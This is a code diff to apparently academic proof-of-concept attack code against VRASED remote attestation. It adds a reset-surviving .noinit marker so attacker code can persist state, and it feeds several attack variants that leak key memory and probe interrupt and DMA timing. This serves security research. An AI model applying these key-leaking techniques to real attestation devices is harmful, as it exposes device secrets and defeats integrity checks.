@@ -151,10 +151,33 @@ void leak_key(uint8_t *buf, int start, int end)
     printf("\n");
 }
 
-int attack_iteration = 0;
+int have_reset = 0;
+
+/**
+ * Demonstrate how VRASED attackers with arbitrary untrusted code execution can
+ * detect and persist state across resets (as used in some of the attacks below).
+ *
+ * NOTE: the approach below uses a simple .noinit global variable, which, once
+ * initialized to a known magic value, will survive across resets (i.e., it
+ * will not be zeroed by the reset vector code; its value is unspecified in
+ * real RAM and will very likely not be exactly the magic marker 0xdead).
+ *
+ * Alternatively, when the attacker controls a custom DMA peripheral, a reset
+ * can also be detected by polling the `DMA_ATTACKER_PERSISTENT_FLAG` adress of
+ * our custom DMA attacker peripheral.
+ */
+int __attribute__ ((section (".noinit"))) reset_marker;
+int __attribute__ ((section (".noinit"))) attack_iteration;
 
 void VRASED (uint8_t *challenge, uint8_t *response) {
-    printf("Attack: %d\n", __ATTACK);
+    if (reset_marker == 0xdead)
+        have_reset = 1;
+    else {
+        reset_marker = 0xdead;
+        attack_iteration = 0;
+    }
+
+    printf("Attack: %d; have_reset: %d\n", __ATTACK, have_reset);
 
     #if __ATTACK == 1
       leak_key((uint8_t*) KEY_ADDR, 31, 64);
@@ -173,7 +196,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 3
-      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+      if (have_reset) {
         leak_key((uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
         return;
       } else {
@@ -221,7 +244,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 5
-      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+      if (have_reset) {
         uint16_t delay = *((uint16_t*) DMA_ATTACKER_RESET_CNT);
         printf("Interrupt delay: %u\n", delay);
 
@@ -251,7 +274,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     #if __ATTACK == 6
-      if (*((uint16_t*) DMA_ATTACKER_PERSISTENT_FLAG)) {
+      if (have_reset) {
         uint16_t delayed = *((uint16_t*) DMA_ATTACKER_DELAYED);
         printf("DMA delayed: %s\n", delayed ? "Yes" : "No");
 
